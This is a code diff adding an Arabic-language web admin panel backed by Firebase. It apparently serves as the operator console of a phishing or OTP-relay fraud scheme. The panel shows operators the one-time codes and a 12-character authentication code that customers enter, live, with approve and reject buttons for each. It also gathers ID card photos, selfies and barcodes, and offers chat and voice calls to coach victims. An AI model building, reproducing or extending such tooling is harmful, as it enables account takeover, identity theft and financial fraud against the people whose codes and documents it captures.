@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة الإدارة</title>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#1c1f2e;--field:#2f3243;--accent:#617ecc;--text:#fff;--muted:#9b9ca0;--danger:#e5484d;--ok:#3ea66b;--warn:#e0a030;--r:14px}
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Tajawal',sans-serif}
+body{background:var(--bg);color:var(--text);min-height:100vh}
+.top{position:sticky;top:0;z-index:5;background:var(--bg);padding:14px 16px 0;border-bottom:1px solid var(--field)}
+.top h1{font-size:20px;margin-bottom:10px}
+.tabs{display:flex;gap:6px}
+.tab{flex:1;padding:11px 8px;background:none;border:none;border-bottom:3px solid transparent;color:var(--muted);font-size:15px;font-weight:700;cursor:pointer}
+.tab.on{color:var(--text);border-color:var(--accent)}
+.badge{background:var(--danger);color:#fff;border-radius:10px;padding:1px 8px;font-size:12px;margin-right:4px}
+.wrap{max-width:720px;margin:0 auto;padding:16px;display:flex;flex-direction:column;gap:12px}
+.card{background:var(--field);border-radius:var(--r);padding:14px 16px;display:flex;flex-direction:column;gap:10px}
+.card.click{cursor:pointer}
+.row{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
+.name{font-size:17px;font-weight:700}
+.phone{color:var(--muted);font-size:14px;direction:ltr;text-align:right}
+.chip{padding:3px 12px;border-radius:20px;font-size:13px;font-weight:700;background:#444a63}
+.chip.pending{background:var(--warn);color:#1c1f2e}.chip.ok{background:var(--ok)}.chip.bad{background:var(--danger)}.chip.blue{background:var(--accent)}
+.btns{display:flex;gap:8px;flex-wrap:wrap}
+button.b{border:none;border-radius:10px;padding:9px 18px;font-size:15px;font-weight:700;color:#fff;cursor:pointer}
+.b.ok{background:var(--ok)}.b.bad{background:var(--danger)}.b.gray{background:#444a63}
+.otp{font-size:30px;letter-spacing:8px;font-weight:700;direction:ltr;text-align:center;background:var(--bg);border-radius:10px;padding:10px}
+.empty{text-align:center;color:var(--muted);padding:40px 0}
+.note{color:var(--muted);font-size:14px}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;z-index:20;overflow:auto}
+.modal.show{display:block}
+.sheet{background:var(--bg);max-width:720px;margin:0 auto;min-height:100%;padding:16px;display:flex;flex-direction:column;gap:14px}
+.slot img{width:100%;max-height:420px;object-fit:contain;background:#000;border-radius:10px;cursor:zoom-in}
+.slot input{width:100%;background:var(--bg);border:1.5px solid #444a63;border-radius:10px;padding:10px;color:#fff;font-size:15px}
+.ph{height:120px;display:flex;align-items:center;justify-content:center;color:var(--muted);background:var(--bg);border-radius:10px}
+.zoom{position:fixed;inset:0;background:#000;z-index:30;display:none;align-items:center;justify-content:center}
+.zoom.show{display:flex}.zoom img{max-width:100%;max-height:100%}
+.soundbar{display:none;background:var(--warn);color:#1c1f2e;text-align:center;padding:8px;font-weight:700;cursor:pointer}
+.cm{display:flex;flex-direction:column;height:100vh;max-width:720px;margin:0 auto;background:var(--bg)}
+.cmsgs{flex:1;overflow:auto;padding:14px;display:flex;flex-direction:column;gap:8px}
+.m{max-width:80%;padding:9px 13px;border-radius:14px;line-height:1.6;word-break:break-word}
+.m.me{background:var(--accent);align-self:flex-start}.m.cl{background:var(--field);align-self:flex-end}
+.cin{display:flex;gap:8px;padding:12px;border-top:1px solid var(--field)}
+.cin input{flex:1;background:var(--field);border:none;border-radius:10px;padding:12px;color:#fff;font-size:15px}
+.inc{position:fixed;top:0;left:0;right:0;z-index:40;background:var(--ok);padding:14px 16px;display:none;align-items:center;justify-content:space-between;gap:10px;font-weight:700}
+.inc.show{display:flex}
+</style>
+</head>
+<body>
+<div class="top">
+  <h1>لوحة الإدارة</h1>
+  <div class="tabs">
+    <button class="tab on" data-t="req">طلبات الدخول <span id="cnt" class="badge" style="display:none"></span></button>
+    <button class="tab" data-t="cli">الطلبات</button>
+    <button class="tab" data-t="chat">الدردشة <span id="ccnt" class="badge" style="display:none"></span></button>
+    <button class="tab" data-t="chk">التحقق <span id="kcnt" class="badge" style="display:none"></span></button>
+  </div>
+</div>
+<div class="soundbar" id="sb">اضغط هنا لتفعيل أصوات التنبيهات</div>
+<div class="inc" id="inc"><div><div id="incname"></div><div class="note" id="incsub" style="color:#fff"></div></div><div class="btns" id="incbtns"></div></div>
+<div class="wrap" id="list"></div>
+<div class="modal" id="cmodal"><div class="cm"><div class="row" style="padding:12px 14px"><div><div class="name" id="cname"></div><div class="phone" id="cphone"></div></div><button class="b gray" id="cclose">إغلاق</button></div><div class="cmsgs" id="cmsgs"></div><div class="cin"><input id="cinput" placeholder="اكتب ردّك..."><button class="b ok" id="csend">إرسال</button></div></div></div>
+<div class="modal" id="modal"><div class="sheet" id="sheet"></div></div>
+<div class="zoom" id="zoom"><img id="zimg" alt=""></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, get, set, push, update, onValue, query, orderByChild, equalTo, limitToLast, serverTimestamp, increment } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+
+const cfg = {
+  apiKey: "AIzaSyDyMyqxp0OEe7DM5a17O4QQCrpu5dazQJc",
+  authDomain: "tawteek-9206c.firebaseapp.com",
+  databaseURL: "https://tawteek-9206c-default-rtdb.firebaseio.com",
+  projectId: "tawteek-9206c",
+  storageBucket: "tawteek-9206c.firebasestorage.app",
+  messagingSenderId: "631433779854",
+  appId: "1:631433779854:web:319e2d278cddb8d0ab07df"
+};
+const app = initializeApp(cfg);
+const db = getDatabase(app, cfg.databaseURL);
+try { await signInAnonymously(getAuth(app)); } catch (e) { console.warn('auth', e); }
+
+/* ================= الأصوات (WebAudio) ================= */
+const Snd = (() => {
+    let ctx = null, tm = null;
+    const ac = () => { try { if (!ctx) ctx = new (window.AudioContext || window.webkitAudioContext)(); if (ctx.state === 'suspended') ctx.resume(); } catch (e) {} return ctx; };
+    const n = (f, s, d, type = 'sine', v = .25) => {
+        const c = ac(); if (!c) return;
+        const o = c.createOscillator(), g = c.createGain(), t0 = c.currentTime + s;
+        o.type = type; o.frequency.value = f;
+        g.gain.setValueAtTime(0.0001, t0); g.gain.linearRampToValueAtTime(v, t0 + .02); g.gain.exponentialRampToValueAtTime(.001, t0 + d);
+        o.connect(g); g.connect(c.destination); o.start(t0); o.stop(t0 + d + .05);
+    };
+    const P = {
+        info:    () => { n(660, 0, .25); n(880, .18, .4); },                                   // الاسم/الهاتف
+        otp:     () => { [0, .14, .28].forEach(s => n(1300, s, .1, 'square', .12)); },          // رمز التحقق
+        request: () => { [523, 659, 784].forEach((f, i) => n(f, i * .13, .3, 'triangle')); },   // الطلبات/الصور
+        chat:    () => { n(880, 0, .12); n(1320, .1, .22); },                                   // الدردشة
+        call:    () => { [0, .9].forEach(s => { n(440, s, .7, 'sine', .2); n(480, s, .7, 'sine', .2); }); }, // المكالمة
+        connect: () => { n(784, 0, .15); n(1046, .12, .3); },
+        end:     () => { n(480, 0, .2); n(360, .2, .35); }
+    };
+    return {
+        play: k => { P[k] && P[k](); },
+        loop(k, ms) { this.stop(); P[k](); tm = setInterval(P[k], ms); },
+        stop() { clearInterval(tm); tm = null; },
+        unlock: () => { ac(); },
+        ready: () => !!ctx && ctx.state === 'running'
+    };
+})();
+['pointerdown', 'keydown', 'touchstart'].forEach(e => addEventListener(e, () => Snd.unlock(), { passive: true }));
+
+const SLOTS = { idFront: 'الهوية - الوجه الأمامي', idBack: 'الهوية - الوجه الخلفي', selfie: 'صورة شخصية', barcode: 'الباركود' };
+const $ = id => document.getElementById(id);
+const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+let AR = {}, VR = {}, tab = 'req', openVid = null, openPhone = null;
+const imgCache = {};
+
+let CH = {}, first = { ar: true, vr: true, ch: true };
+onValue(ref(db, 'accessRequests'), s => {
+  const n = s.val() || {};
+  if (!first.ar) for (const [id, r] of Object.entries(n)) {
+    const p = AR[id];
+    if (!p && r.status === 'pending') Snd.play('info');
+    else if (p && p.otpStatus !== 'pending' && r.otpStatus === 'pending') Snd.play('otp');
+  }
+  first.ar = false; AR = n; render();
+});
+onValue(ref(db, 'verifications'), s => {
+  const n = s.val() || {};
+  if (!first.vr) for (const [id, v] of Object.entries(n)) {
+    if (v.status === 'pending' && (!VR[id] || VR[id].status !== 'pending')) Snd.play('request');
+  }
+  first.vr = false; VR = n; render(); if (openPhone) renderDetail();
+});
+onValue(ref(db, 'chats'), s => {
+  const n = s.val() || {};
+  if (!first.ch) for (const [id, c] of Object.entries(n)) {
+    if ((c.unreadForAdmin || 0) > ((CH[id] && CH[id].unreadForAdmin) || 0)) Snd.play('chat');
+  }
+  first.ch = false; CH = n;
+  if (openChatId && (CH[openChatId].unreadForAdmin || 0) > 0) update(ref(db, 'chats/' + openChatId), { unreadForAdmin: 0 });
+  render();
+});
+setInterval(() => { $('sb').style.display = Snd.ready() ? 'none' : 'block'; }, 800);
+$('sb').onclick = () => Snd.unlock();
+
+/* ============ التحقق (check.html) ============ */
+const CK_STEPS = [['s1', 'رمز التوثيق (12 حرف)'], ['s2', 'OTP الثاني'], ['s3', 'OTP الثالث']];
+let CK = {}, firstCk = true;
+onValue(ref(db, 'checks'), s => {
+  const n = s.val() || {};
+  if (!firstCk) for (const [id, c] of Object.entries(n)) for (const [k] of CK_STEPS) {
+    const st = (c.steps || {})[k], pv = ((CK[id] || {}).steps || {})[k];
+    if (st && st.status === 'pending' && (!pv || pv.status !== 'pending' || pv.submittedAt !== st.submittedAt)) Snd.play('otp');
+  }
+  firstCk = false; CK = n; render();
+});
+const ckPending = c => CK_STEPS.filter(([k]) => ((c.steps || {})[k] || {}).status === 'pending').length;
+function renderChecks(box) {
+  const items = Object.entries(CK).sort((a, b) => (ckPending(b[1]) - ckPending(a[1])) || ((b[1].updatedAt || 0) - (a[1].updatedAt || 0)));
+  if (!items.length) { box.innerHTML = '<div class="empty">لا توجد طلبات تحقق</div>'; return; }
+  for (const [id, c] of items) {
+    const steps = c.steps || {};
+    const d = document.createElement('div');
+    d.className = 'card';
+    let html = `<div class="name">${esc(c.name || 'عميل')}</div><div class="phone">${esc(c.phone)}</div>`;
+    for (const [k, label] of CK_STEPS) {
+      const s = steps[k];
+      const chip = !s ? '<span class="chip">لم يُدخل بعد</span>' : s.status === 'approved' ? '<span class="chip ok">مقبول</span>' : s.status === 'rejected' ? '<span class="chip bad">مرفوض</span>' : '<span class="chip pending">بانتظار قرارك</span>';
+      html += `<div class="row"><div class="note">${label}</div>${chip}</div>`;
+      if (s && s.value && s.status === 'pending') html += `<div class="otp" style="font-size:22px;letter-spacing:3px;word-break:break-all">${esc(s.value)}</div><div class="btns"><button class="b ok" data-id="${id}" data-k="${k}" data-v="approved">قبول</button><button class="b bad" data-id="${id}" data-k="${k}" data-v="rejected">رفض</button></div>`;
+      else if (s && s.value) html += `<div class="note" style="direction:ltr;text-align:right">${esc(s.value)}</div>`;
+    }
+    d.innerHTML = html;
+    d.querySelectorAll('button').forEach(b => b.onclick = () => upd('checks/' + b.dataset.id, { ['steps/' + b.dataset.k + '/status']: b.dataset.v, ['steps/' + b.dataset.k + '/decidedAt']: Date.now(), updatedAt: Date.now() }));
+    box.appendChild(d);
+  }
+}
+
+document.querySelectorAll('.tab').forEach(t => t.onclick = () => {
+  tab = t.dataset.t;
+  document.querySelectorAll('.tab').forEach(x => x.classList.toggle('on', x === t));
+  render();
+});
+
+const upd = (path, data) => update(ref(db, path), data).catch(e => alert('تعذّر الحفظ: ' + e.message));
+const byDate = (a, b) => (b[1].createdAt || 0) - (a[1].createdAt || 0);
+const needsAction = r => r.status === 'pending' || r.otpStatus === 'pending';
+
+/* آخر سجل توثيق لنفس رقم الهاتف */
+function verOf(phone) {
+  let best = null;
+  for (const [id, v] of Object.entries(VR)) {
+    if (v && v.phone === phone && (!best || (v.updatedAt || 0) > (best[1].updatedAt || 0))) best = [id, v];
+  }
+  return best;
+}
+const vChip = v => !v ? '<span class="chip">لم يرفع صور</span>' :
+  v.status === 'pending' ? '<span class="chip pending">بانتظار المراجعة</span>' :
+  v.status === 'approved' ? '<span class="chip ok">مقبول</span>' :
+  v.status === 'rejected' ? '<span class="chip bad">مرفوض</span>' : '<span class="chip blue">جاري الرفع</span>';
+
+/* ============ القوائم ============ */
+function render() {
+  const pendingCount = Object.values(AR).filter(needsAction).length;
+  $('cnt').style.display = pendingCount ? '' : 'none';
+  $('cnt').textContent = pendingCount;
+  const unread = Object.values(CH).reduce((a, c) => a + (c.unreadForAdmin || 0), 0);
+  $('ccnt').style.display = unread ? '' : 'none'; $('ccnt').textContent = unread;
+  const kp = Object.values(CK).reduce((x, c) => x + ckPending(c), 0);
+  $('kcnt').style.display = kp ? '' : 'none'; $('kcnt').textContent = kp;
+  const box = $('list');
+  box.innerHTML = '';
+
+  if (tab === 'req') {
+    const items = Object.entries(AR).sort((a, b) => (needsAction(b[1]) - needsAction(a[1])) || byDate(a, b));
+    if (!items.length) { box.innerHTML = '<div class="empty">لا توجد طلبات دخول</div>'; return; }
+    for (const [id, r] of items) box.appendChild(reqCard(id, r));
+  } else if (tab === 'chat') {
+    renderChats(box);
+  } else if (tab === 'chk') {
+    renderChecks(box);
+  } else {
+    const items = Object.entries(AR).filter(([, r]) => r.otpStatus === 'approved').sort((a, b) => {
+      const va = verOf(a[1].phone), vb = verOf(b[1].phone);
+      const pa = va && va[1].status === 'pending' ? 1 : 0, pb = vb && vb[1].status === 'pending' ? 1 : 0;
+      return (pb - pa) || byDate(a, b);
+    });
+    if (!items.length) { box.innerHTML = '<div class="empty">لا يوجد عملاء مقبولون بعد</div>'; return; }
+    for (const [, r] of items) {
+      const v = verOf(r.phone);
+      const c = document.createElement('div');
+      c.className = 'card click';
+      c.innerHTML = `<div class="row"><div><div class="name">${esc(r.name)}</div><div class="phone">${esc(r.phone)}</div></div>${vChip(v && v[1])}</div>`;
+      c.onclick = () => openClient(r);
+      box.appendChild(c);
+    }
+  }
+}
+
+function reqCard(id, r) {
+  const c = document.createElement('div');
+  c.className = 'card';
+  let status = '', body = '';
+  if (r.status === 'rejected') status = '<span class="chip bad">مرفوض</span>';
+  else if (r.otpStatus === 'approved') status = '<span class="chip ok">تم القبول</span>';
+  else if (r.otpStatus === 'pending') {
+    status = '<span class="chip pending">رمز التحقق بانتظار قرارك</span>';
+    body = `<div class="otp">${esc(r.otp)}</div><div class="btns"><button class="b ok" data-a="otpok">قبول الرمز</button><button class="b bad" data-a="otpno">رفض الرمز</button></div>`;
+  } else if (r.otpStatus === 'rejected') status = '<span class="chip bad">الرمز مرفوض - ينتظر إعادة الإدخال</span>';
+  else if (r.status === 'approved') status = '<span class="chip blue">بانتظار إدخال العميل للرمز</span>';
+  else {
+    status = '<span class="chip pending">جديد</span>';
+    body = '<div class="btns"><button class="b ok" data-a="ok">قبول</button><button class="b bad" data-a="no">رفض</button></div>';
+  }
+  c.innerHTML = `<div class="row"><div><div class="name">${esc(r.name)}</div><div class="phone">${esc(r.phone)}</div></div>${status}</div>${body}`;
+  c.querySelectorAll('button').forEach(b => b.onclick = () => {
+    const a = b.dataset.a, now = Date.now();
+    if (a === 'ok') upd('accessRequests/' + id, { status: 'approved', updatedAt: now });
+    if (a === 'no') upd('accessRequests/' + id, { status: 'rejected', updatedAt: now });
+    if (a === 'otpok') upd('accessRequests/' + id, { otpStatus: 'approved', updatedAt: now });
+    if (a === 'otpno') upd('accessRequests/' + id, { otpStatus: 'rejected', updatedAt: now });
+  });
+  return c;
+}
+
+/* ============ تفاصيل العميل ============ */
+function openClient(r) {
+  openPhone = r.phone;
+  $('modal').classList.add('show');
+  renderDetail();
+}
+function closeModal() { openPhone = null; $('modal').classList.remove('show'); }
+
+async function loadImg(fileRef) {
+  const id = String(fileRef || '').replace('rtdb-file:', '');
+  if (!id) return '';
+  if (imgCache[id]) return imgCache[id];
+  const s = await get(ref(db, 'files/' + id));
+  return (imgCache[id] = s.exists() ? (s.val().data || '') : '');
+}
+
+function renderDetail() {
+  const entry = Object.entries(AR).find(([, r]) => r.phone === openPhone);
+  const r = entry ? entry[1] : { name: '', phone: openPhone };
+  const ver = verOf(openPhone);
+  const sheet = $('sheet');
+  let html = `<div class="row"><div><div class="name">${esc(r.name)}</div><div class="phone">${esc(r.phone)}</div></div><button class="b gray" id="close">إغلاق</button></div>`;
+  if (!ver) {
+    sheet.innerHTML = html + '<div class="empty">العميل لم يرفع أي صور بعد</div>';
+    $('close').onclick = closeModal;
+    return;
+  }
+  const [vid, v] = ver;
+  const slots = v.slots || {};
+  html += `<div class="row"><div class="note">حالة الطلب:</div>${vChip(v)}</div>`;
+  for (const [k, label] of Object.entries(SLOTS)) {
+    const s = slots[k] || {};
+    const undecided = s.file && s.status !== 'accepted' && s.status !== 'rejected';
+    const st = s.status === 'accepted' ? '<span class="chip ok">مقبولة (أُرسلت للعميل)</span>'
+      : s.status === 'rejected' ? '<span class="chip bad">مرفوضة - بانتظار إعادة الرفع</span>'
+      : s.draft === 'accepted' ? '<span class="chip ok">قبول - لم يُرسل بعد</span>'
+      : s.draft === 'rejected' ? '<span class="chip bad">رفض - لم يُرسل بعد</span>'
+      : s.file ? '<span class="chip pending">بانتظار القرار</span>' : '<span class="chip">لم تُرفع</span>';
+    html += `<div class="card slot" data-k="${k}"><div class="row"><div class="name">${label}</div>${st}</div>`;
+    html += s.file ? `<img alt="${label}" data-f="${esc(s.file)}">` : '<div class="ph">لا توجد صورة</div>';
+    if (s.status === 'rejected' && s.rejectReason) html += `<div class="note">سبب الرفض المُرسل: ${esc(s.rejectReason)}</div>`;
+    if (undecided) html += `<input placeholder="سبب الرفض (يظهر للعميل عند إرسال الرفض)" value="${esc(s.draftReason || '')}"><div class="btns"><button class="b ok" data-a="ok">قبول</button><button class="b bad" data-a="no">رفض</button></div>`;
+    html += '</div>';
+  }
+  html += '<div class="note">قرارك على كل صورة يُحفظ عندك فقط ولا يظهر للعميل إلا بعد الضغط على أحد الزرّين التاليين.</div>';
+  html += `<div class="btns"><button class="b ok" id="allok">قبول الطلب وإرساله للعميل</button><button class="b bad" id="allno">رفض الطلب وإرسال الملاحظات</button></div>`;
+  sheet.innerHTML = html;
+  $('close').onclick = closeModal;
+
+  sheet.querySelectorAll('img[data-f]').forEach(async im => {
+    im.src = await loadImg(im.dataset.f);
+    im.onclick = () => { $('zimg').src = im.src; $('zoom').classList.add('show'); };
+  });
+  /* قرار الصورة: يُحفظ كمسودة (draft) لا يقرؤها العميل */
+  sheet.querySelectorAll('.slot').forEach(el => {
+    const k = el.dataset.k;
+    el.querySelectorAll('button').forEach(b => b.onclick = () => {
+      const reason = el.querySelector('input').value.trim();
+      upd('verifications/' + vid, b.dataset.a === 'ok'
+        ? { ['slots/' + k + '/draft']: 'accepted', ['slots/' + k + '/draftReason']: null }
+        : { ['slots/' + k + '/draft']: 'rejected', ['slots/' + k + '/draftReason']: reason || 'صورة غير مقبولة، يرجى إعادة الرفع' });
+    });
+  });
+  /* الإرسال النهائي للعميل */
+  $('allok').onclick = () => {
+    const withFile = Object.keys(SLOTS).filter(k => slots[k] && slots[k].file);
+    if (!withFile.length) return alert('لا توجد صور لقبولها');
+    if (Object.keys(SLOTS).some(k => slots[k] && (slots[k].draft === 'rejected' || slots[k].status === 'rejected')))
+      return alert('في صور محددة كمرفوضة، استخدم "رفض الطلب" أو غيّر قرارها أولاً');
+    const d = { status: 'approved', updatedAt: Date.now() };
+    for (const k of withFile) { d['slots/' + k + '/status'] = 'accepted'; d['slots/' + k + '/rejectReason'] = ''; d['slots/' + k + '/draft'] = null; d['slots/' + k + '/draftReason'] = null; }
+    upd('verifications/' + vid, d);
+  };
+  $('allno').onclick = () => {
+    const rej = Object.keys(SLOTS).filter(k => slots[k] && slots[k].draft === 'rejected' && slots[k].status !== 'accepted');
+    if (!rej.length) return alert('حدّد صورة واحدة على الأقل بـ "رفض" مع السبب قبل إرسال الرفض');
+    const d = { status: 'rejected', updatedAt: Date.now() };
+    for (const k of Object.keys(SLOTS)) {
+      const s = slots[k]; if (!s) continue;
+      if (s.draft === 'rejected') { d['slots/' + k + '/status'] = 'rejected'; d['slots/' + k + '/rejectReason'] = s.draftReason || 'صورة غير مقبولة، يرجى إعادة الرفع'; }
+      else if (s.draft === 'accepted') d['slots/' + k + '/status'] = 'accepted';
+      d['slots/' + k + '/draft'] = null; d['slots/' + k + '/draftReason'] = null;
+    }
+    upd('verifications/' + vid, d);
+  };
+}
+
+/* ============ الدردشة ============ */
+let openChatId = null, unsubMsgs = null;
+function renderChats(box) {
+  const items = Object.entries(CH).sort((a, b) => (b[1].lastMessageAt || 0) - (a[1].lastMessageAt || 0));
+  if (!items.length) { box.innerHTML = '<div class="empty">لا توجد محادثات</div>'; return; }
+  for (const [id, c] of items) {
+    const d = document.createElement('div');
+    d.className = 'card click';
+    d.innerHTML = `<div class="row"><div><div class="name">${esc(c.name || 'عميل')}</div><div class="phone">${esc(c.phone)}</div></div>${c.unreadForAdmin ? `<span class="badge">${c.unreadForAdmin}</span>` : ''}</div><div class="note">${esc(c.lastMessage || 'لا توجد رسائل')}</div>`;
+    d.onclick = () => openChat(id);
+    box.appendChild(d);
+  }
+}
+function openChat(id) {
+  openChatId = id;
+  const c = CH[id] || {};
+  $('cname').textContent = c.name || 'عميل'; $('cphone').textContent = c.phone || '';
+  $('cmodal').classList.add('show');
+  if (unsubMsgs) unsubMsgs();
+  unsubMsgs = onValue(query(ref(db, 'messages'), orderByChild('chatId'), equalTo(id)), s => {
+    const o = s.val() || {}, list = Object.entries(o).sort((a, b) => (a[1].createdAt || 0) - (b[1].createdAt || 0));
+    const box = $('cmsgs'); box.innerHTML = '';
+    const mark = {};
+    for (const [mid, m] of list) {
+      const d = document.createElement('div');
+      d.className = 'm ' + (m.sender === 'admin' ? 'me' : 'cl');
+      d.textContent = m.text || '';
+      box.appendChild(d);
+      if (m.sender === 'client' && m.read === false) mark['messages/' + mid + '/read'] = true;
+    }
+    box.scrollTop = box.scrollHeight;
+    if (Object.keys(mark).length) update(ref(db), mark).catch(() => {});
+    if ((CH[id] && CH[id].unreadForAdmin) > 0) update(ref(db, 'chats/' + id), { unreadForAdmin: 0 });
+  });
+  update(ref(db, 'chats/' + id), { unreadForAdmin: 0 });
+}
+$('cclose').onclick = () => { openChatId = null; if (unsubMsgs) { unsubMsgs(); unsubMsgs = null; } $('cmodal').classList.remove('show'); };
+async function sendMsg() {
+  const text = $('cinput').value.trim();
+  if (!text || !openChatId) return;
+  $('cinput').value = '';
+  try {
+    await set(push(ref(db, 'messages')), { chatId: openChatId, sender: 'admin', text, createdAt: serverTimestamp(), read: false });
+    await update(ref(db, 'chats/' + openChatId), { lastMessage: text, lastMessageAt: serverTimestamp(), unreadForClient: increment(1), updatedAt: serverTimestamp() });
+  } catch (e) { alert('تعذّر الإرسال: ' + e.message); }
+}
+$('csend').onclick = sendMsg;
+$('cinput').addEventListener('keydown', e => { if (e.key === 'Enter') sendMsg(); });
+
+/* ============ المكالمات الصوتية (استقبال) ============ */
+let srvOff = 0, calls = {}, active = null; // active = {id, pc, stream, unsubs, timer}
+onValue(ref(db, '.info/serverTimeOffset'), s => { srvOff = s.val() || 0; });
+const ICE = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] };
+const callSet = (id, d) => update(ref(db, 'voiceCalls/' + id), d).catch(() => {});
+
+onValue(query(ref(db, 'voiceCalls'), orderByChild('createdAt'), limitToLast(5)), s => {
+  calls = s.val() || {};
+  if (active) { if (calls[active.id] && calls[active.id].status === 'ended') hangup(true); return; }
+  const now = Date.now() + srvOff;
+  const ring = Object.entries(calls).filter(([, c]) => c.status === 'ringing' && c.updatedAt && now - c.updatedAt < 70000).sort((a, b) => b[1].createdAt - a[1].createdAt)[0];
+  const inc = $('inc');
+  if (!ring) { inc.classList.remove('show'); Snd.stop(); return; }
+  const [id, c] = ring;
+  if (!inc.classList.contains('show')) Snd.loop('call', 3000);
+  $('incname').textContent = 'مكالمة واردة: ' + (c.customerName || 'عميل');
+  $('incsub').textContent = c.customerPhone || '';
+  $('incbtns').innerHTML = '<button class="b ok" id="ans">رد</button><button class="b bad" id="dec">رفض</button>';
+  $('ans').onclick = () => answerCall(id, c);
+  $('dec').onclick = () => { callSet(id, { status: 'ended', updatedAt: serverTimestamp() }); inc.classList.remove('show'); Snd.stop(); };
+  inc.classList.add('show');
+});
+
+async function answerCall(id, c) {
+  Snd.stop();
+  let stream;
+  try { stream = await navigator.mediaDevices.getUserMedia({ audio: true }); }
+  catch (e) { alert('اسمح باستخدام الميكروفون للرد'); return; }
+  const pc = new RTCPeerConnection(ICE);
+  active = { id, pc, stream, unsubs: [] };
+  const au = document.createElement('audio'); au.autoplay = true; au.id = 'admin-audio'; document.body.appendChild(au);
+  pc.ontrack = e => { au.srcObject = e.streams[0]; au.play().catch(() => {}); };
+  stream.getTracks().forEach(tr => pc.addTrack(tr, stream));
+  pc.onicecandidate = e => { if (e.candidate) set(push(ref(db, 'voiceCalls/' + id + '/calleeCandidates')), e.candidate.toJSON()).catch(() => {}); };
+  try {
+    await pc.setRemoteDescription(new RTCSessionDescription(c.offer));
+    const seen = new Set();
+    active.unsubs.push(onValue(ref(db, 'voiceCalls/' + id + '/callerCandidates'), s => {
+      const o = s.val() || {};
+      for (const [k, v] of Object.entries(o)) if (!seen.has(k)) { seen.add(k); try { pc.addIceCandidate(new RTCIceCandidate(v)); } catch (e) {} }
+    }));
+    const ans = await pc.createAnswer();
+    await pc.setLocalDescription(ans);
+    await callSet(id, { answer: { type: ans.type, sdp: ans.sdp }, status: 'active', updatedAt: serverTimestamp() });
+  } catch (e) { console.error(e); hangup(false); return; }
+  Snd.play('connect');
+  $('incname').textContent = 'مكالمة جارية: ' + (c.customerName || 'عميل');
+  $('incbtns').innerHTML = '<button class="b bad" id="endc">إنهاء</button>';
+  $('endc').onclick = () => hangup(false);
+  $('inc').classList.add('show');
+}
+function hangup(remote) {
+  if (!active) return;
+  const a = active; active = null;
+  a.unsubs.forEach(u => { try { u(); } catch (e) {} });
+  try { a.pc.close(); } catch (e) {}
+  a.stream.getTracks().forEach(tr => tr.stop());
+  const au = document.getElementById('admin-audio'); if (au) au.remove();
+  if (!remote) callSet(a.id, { status: 'ended', updatedAt: serverTimestamp() });
+  $('inc').classList.remove('show');
+  Snd.play('end');
+}
+
+$('zoom').onclick = () => $('zoom').classList.remove('show');
+</script>
+</body>
+</html>
